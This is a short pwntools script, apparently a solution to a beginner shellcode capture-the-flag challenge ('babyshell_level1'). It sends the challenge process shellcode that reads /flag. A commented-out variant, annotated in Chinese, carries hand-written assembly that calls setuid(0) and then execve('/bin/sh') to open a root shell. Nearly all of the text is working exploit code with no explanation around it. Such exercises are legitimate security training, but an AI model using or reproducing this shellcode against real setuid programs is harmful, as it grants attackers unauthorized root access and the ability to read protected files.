
from pwn import *
context(arch = 'amd64' , os = 'linux')

p=process("/challenge/babyshell_level1")
shellcode=shellcraft.cat("/flag")
shellcode=asm(shellcode)
p.send(shellcode)
p.interactive()

'''
from pwn import *

context.arch = 'amd64'

p = process('/challenge/babyshell_level1')

# 执行 /bin/sh 以获取特权shell
shellcode = """
    xor    rdi, rdi              # 设置 rdi 寄存器为 0，表示设置当前进程的有效用户 ID
    mov    eax, 0x69             # 将系统调用号 105 (setuid) 放入 eax 寄存器
    syscall                      # 执行系统调用，设置当前进程的有效用户 ID 为 0（root）
    
    mov    rax, 59               # 设置 rax 寄存器为 59，表示系统调用 execve
    lea    rdi, [rip+binsh]      # 将 /bin/sh 字符串地址放入 rdi 寄存器
    xor    rsi, rsi              # 将 rsi 寄存器置零
    xor    rdx, rdx              # 将 rdx 寄存器置零
    syscall                      # 执行系统调用，启动 /bin/sh

binsh:
    .string "/bin/sh"
"""

shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()


'''

